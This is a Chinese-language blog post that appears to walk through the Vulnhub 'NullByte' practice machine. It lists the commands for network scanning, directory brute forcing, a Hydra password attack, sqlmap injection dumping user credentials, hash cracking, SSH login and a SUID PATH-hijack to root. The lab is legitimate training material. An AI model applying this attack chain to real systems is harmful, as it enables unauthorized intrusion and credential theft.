---
title: 靶机渗透实战基础-Vulnhub-NullByte
date: 2024-01-19 18:47:31
tags: 渗透测试
mathjax: true
---

# 靶机渗透实战基础-Vulnhub-NullByte

## 主机发现&端口扫描

emm...没给IP，得自己扫：

```bash
sudo arp-scan -l
```

或另一种方法：

```bash
nmap -sn 192.168.2.0/24
```

再或另一种方法：

```bash
sudo netdiscover -i wlan0 -r 192.168.2.0/24
```

发现NullByte主机IP为192.168.2.183。

分别探测该主机TCP和UDP端口服务：

```bash
nmap --min-rate 10000 -sT -p- 192.168.2.183
sudo nmap --min-rate 10000 -sU -p- 192.168.2.183
```

结果分别如下：

```
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
777/tcp   open  multiling-http
58567/tcp open  unknown

PORT      STATE SERVICE
111/udp   open  rpcbind
5353/udp  open  zeroconf
49569/udp open  unknown
MAC Address: 08:00:27:0E:35:55 (Oracle VirtualBox virtual NIC)
```

分别对每个端口进行详细探测，包括版本、操作系统、默认脚本探测等：

```bash
sudo nmap -sT -sC -sV -O -p 80,111,777,42049 192.168.2.183
```

扫描结果：

```
PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.10 ((Debian))
|_http-title: Null Byte 00 - level 1
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37605/udp6  status
|   100024  1          39862/tcp6  status
|   100024  1          49569/udp   status
|_  100024  1          58567/tcp   status
777/tcp   open   ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
42049/tcp closed unknown
MAC Address: 08:00:27:0E:35:55 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

80有Apache；111为rpc端口，有rpcbind漏洞；777为SSH；42049也为rpc端口。

## 漏洞发现

### 80端口

访问，只有一张图片和一句话“If you search for the laws of harmony, you will find knowledge.”，源码也没有可用信息。

爆目录，将请求为200、301、302、403、401的文件写入result.txt：

```bash
feroxbuster -u http://192.168.2.183/ -s 200,301,302,403,401 -o result.txt
```

用以下命令查看200、301的结果：

```bash
cat result.txt | awk {'print $1,$6'} | grep 200
cat result.txt | awk {'print $1,$6'} | grep 301
```

（Rust写的feroxbuster就是6,把电脑给我干红温了...

结果发现可能有phpmyadmin后台，摸一下，初始密码登不上。

## 隐写

把主页图片下载下来看元数据：

```bash
wget http://192.168.2.183:80/main.gif
exiftool main.gif
```

找到注释：kzMb5nVYJw，不知道干啥的，不是phpmyadmin，也不是ssh。

## 正解

想不到，访问：http://192.168.2.183/kzMb5nVYJw/

然后Burpsuite抓包，保存请求包到文件123.txt，直接喂给sqlmap：

```bash
sqlmap -r 123.txt --random-agent --level 3
```

没找到合适注入点。

利用Hydra爆，指定为POST方法，用户名随便指定：

```bash
hydra 192.168.2.183 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l admin -P /usr/share/wordlists/rockyou.txt
```

爆出来密码elite。登录后要求输入用户名，盲猜root，提示Fetched data successfully，可能存在SQL注入。GET传参，直接把URL喂给sqlmap：

```bash
sqlmap -u http://192.168.2.183/kzMb5nVYJw/420search.php?usrtosearch=root
```

发现usrtosearch注入点，找flag：

```bash
sqlmap -u http://192.168.2.183/kzMb5nVYJw/420search.php?usrtosearch=root --dbs
sqlmap -u http://192.168.2.183/kzMb5nVYJw/420search.php?usrtosearch=root -D seth --tables
sqlmap -u http://192.168.2.183/kzMb5nVYJw/420search.php?usrtosearch=root -D seth -T users --dump
```

得到密码：YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE

用basecrack解码为：c6d6bd7ebf806f43c76acc3681703b81

来这里解密：http://somd5.com/，解密后为omega。

看到该条数据的user列为ramses，尝试ssh连接：

```bash
ssh ramses@192.168.2.183 -p 777
```

成功连接！

## 提权

找带有SUID位的文件：

```bash
find / -perm -u=s -type f 2>/dev/null 
```

尝试利用/var/www/backup/procwatch提权，procwatch会执行ps命令来查看进程，于是在相同目录下建立/bin/sh的软连接，并将该目录添加到环境变量最前面即可。

```bash
cd /var/www/backup
ln -s /bin/sh ps
export PATH=.:$PATH
./procwatch
```

进入root，可在/root/proof.txt找到ssh密钥。
